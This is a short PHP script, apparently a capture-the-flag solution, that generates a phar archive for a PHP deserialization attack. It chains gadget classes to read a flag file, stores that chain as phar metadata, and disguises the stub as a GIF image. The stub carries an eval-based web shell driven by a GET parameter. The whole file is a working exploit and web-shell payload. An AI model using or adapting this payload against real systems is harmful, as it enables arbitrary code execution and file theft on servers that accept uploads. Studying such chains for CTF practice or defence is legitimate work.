<?php
class C1e4r{
	public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $file;
    public $params;
}

$a = new Test();
$a->params['source'] ='/var/www/html/f1ag.php';

$b = new Show();
$b->str['str']=$a;

$c = new C1e4r();
$c->str = $b;


@unlink("phar.phar");
$phar = new Phar('phar.phar'); //后缀名必须为phar
$phar -> stopBuffering();
$phar -> setStub('GIF89a'.'<?php echo 1;eval($_GET["Smi1e"]);?>'.'<?php __HALT_COMPILER();?>');
$phar -> setMetadata($c); //将自定义的meta-data存入manifest
$phar -> addFromString('test.txt','test');//添加要压缩的文件
$phar -> stopBuffering();   //签名自动计算
